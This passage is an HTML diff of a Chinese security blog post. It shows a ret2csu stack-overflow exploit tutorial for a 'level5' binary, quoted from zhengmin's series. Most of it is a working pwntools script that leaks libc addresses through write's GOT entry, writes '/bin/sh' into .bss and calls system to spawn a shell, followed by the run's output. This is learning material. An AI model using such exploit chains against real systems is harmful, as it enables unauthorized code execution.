+payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x400606</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>got_write<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>got_write<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop_junk_rbx_rbp_r12_r13_r14_r15_ret</span>
+payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x4005F0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]</span>
+payload1 <span class="token operator">+=</span> <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">56</span>
+payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span>
 
-p.recvuntil(&quot;Hello, World\n&quot;)
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Hello, World\n"</span><span class="token punctuation">)</span>
 
-print &quot;\n#############sending payload1#############\n&quot;
-p.send(payload1)
-sleep(1)
+<span class="token keyword">print</span> <span class="token string">"\n#############sending payload1#############\n"</span>
+p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>
+sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
 
-write_addr = u64(p.recv(8))
-print &quot;write_addr: &quot; + hex(write_addr)
+write_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span> <span class="token string">"write_addr: "</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>write_addr<span class="token punctuation">)</span>
 
-system_addr = write_addr - off_system_addr
-print &quot;system_addr: &quot; + hex(system_addr)
+system_addr <span class="token operator">=</span> write_addr <span class="token operator">-</span> off_system_addr
+<span class="token keyword">print</span> <span class="token string">"system_addr: "</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>
 
-bss_addr=0x601028
+bss_addr<span class="token operator">=</span><span class="token number">0x601028</span>
 
-p.recvuntil(&quot;Hello, World\n&quot;)
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Hello, World\n"</span><span class="token punctuation">)</span>
 
-#rdi=  edi = r13,  rsi = r14, rdx = r15 
-#read(rdi=0, rsi=bss_addr, rdx=16)
-payload2 =  &quot;\x00&quot;*136
-payload2 += p64(0x400606) + p64(0) + p64(0) + p64(1) + p64(got_read) + p64(0) + p64(bss_addr) + p64(16) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret
-payload2 += p64(0x4005F0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
-payload2 += &quot;\x00&quot;*56
-payload2 += p64(main)
+<span class="token comment" spellcheck="true">#rdi=  edi = r13,  rsi = r14, rdx = r15 </span>
+<span class="token comment" spellcheck="true">#read(rdi=0, rsi=bss_addr, rdx=16)</span>
+payload2 <span class="token operator">=</span>  <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">136</span>
+payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x400606</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>got_read<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop_junk_rbx_rbp_r12_r13_r14_r15_ret</span>
+payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x4005F0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]</span>
+payload2 <span class="token operator">+=</span> <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">56</span>
+payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span>
 
-print &quot;\n#############sending payload2#############\n&quot;
-p.send(payload2)
-sleep(1)
+<span class="token keyword">print</span> <span class="token string">"\n#############sending payload2#############\n"</span>
+p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>
+sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
 
-p.send(p64(system_addr))
-p.send(&quot;/bin/sh\0&quot;)
-sleep(1)
+p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"/bin/sh\0"</span><span class="token punctuation">)</span>
+sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
 
-p.recvuntil(&quot;Hello, World\n&quot;)
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Hello, World\n"</span><span class="token punctuation">)</span>
 
-#rdi=  edi = r13,  rsi = r14, rdx = r15 
-#system(rdi = bss_addr+8 = &quot;/bin/sh&quot;)
-payload3 =  &quot;\x00&quot;*136
-payload3 += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(bss_addr) + p64(bss_addr+8) + p64(0) + p64(0) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret
-payload3 += p64(0x4005F0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
-payload3 += &quot;\x00&quot;*56
-payload3 += p64(main)
+<span class="token comment" spellcheck="true">#rdi=  edi = r13,  rsi = r14, rdx = r15 </span>
+<span class="token comment" spellcheck="true">#system(rdi = bss_addr+8 = "/bin/sh")</span>
+payload3 <span class="token operator">=</span>  <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">136</span>
+payload3 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x400606</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_addr<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop_junk_rbx_rbp_r12_r13_r14_r15_ret</span>
+payload3 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x4005F0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]</span>
+payload3 <span class="token operator">+=</span> <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">56</span>
+payload3 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span>
 
-print &quot;\n#############sending payload3#############\n&quot;
+<span class="token keyword">print</span> <span class="token string">"\n#############sending payload3#############\n"</span>
 
-sleep(1)
-p.send(payload3)
+sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload3<span class="token punctuation">)</span>
 
-p.interactive()</code></pre><blockquote>
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<blockquote>
 <p>蒸米原文：<br>要注意的是，当我们把程序的io重定向到socket上的时候，根据网络协议，因为发送的数据包过大，read()有时会截断payload，造成payload传输不完整造成攻击失败。这时候要多试几次即可成功。如果进行远程攻击的话，需要保证ping值足够小才行（局域网）。最终执行结果如下：</p>
 </blockquote>
-<pre><code>[+] Started program &#39;./level5&#39;
+<pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Started program <span class="token string">'./level5'</span>
 got_write: 0x601000
 got_read: 0x601008
 off_system_addr: 0xa1c40
 
-#############sending payload1#############
+<span class="token comment" spellcheck="true">#############sending payload1#############</span>
 
 write_addr: 0x7f79d5779370
 system_addr: 0x7f79d56d7730
 
-#############sending payload2#############
+<span class="token comment" spellcheck="true">#############sending payload2#############</span>
 
 
-#############sending payload3#############
+<span class="token comment" spellcheck="true">#############sending payload3#############</span>
 
-[*] Switching to interactive mode
-$ whoami
-mzheng</code></pre><h2 id="5：总结"><a href="#5：总结" class="headerlink" title="5：总结"></a>5：总结</h2><p><strong><em>原来pwn的艺术不是explosion，而是gadgets链构造，这种艺术我等凡人无法欣赏</em></strong></p>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Switching to interactive mode
+$ <span class="token function">whoami</span>
+mzheng</code></pre>
+<h2 id="5：总结"><a href="#5：总结" class="headerlink" title="5：总结"></a>5：总结</h2><p><strong><em>原来pwn的艺术不是explosion，而是gadgets链构造，这种艺术我等凡人无法欣赏</em></strong></p>
 
             </div>
             <hr/>
@@ -1035,14 +1057,14 @@ mzheng</code></pre><h2 id="5：总结"><a href="#5：总结" class="headerlink" 
                     </div>
                 </a>
                 <div class="card-content article-content">
-                    <div class="summary">1：我自己写的一个简单程序#include&lt;stdio.h&gt;
-#include&lt;unistd.h&gt;
-#include&lt;stdlib.h&gt;
+                    <div class="summary">1：我自己写的一个简单程序#include&lt;stdio.h>
+#include&lt;unistd.h>
+#include&lt;stdlib.h>
 int main()
 {
 
     char s[50];
-   </div>
+    puts("wh</div>
                     <div class="publish-info">
                             <span class="publish-date">
                                 <i class="fa fa-clock-o fa-fw icon-date"></i>2020-07-08
@@ -1170,7 +1192,7 @@ int main()
 
             
                 &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-                <span class="white-color">31.5k</span>
+                <span class="white-color">30k</span>
             
 
             
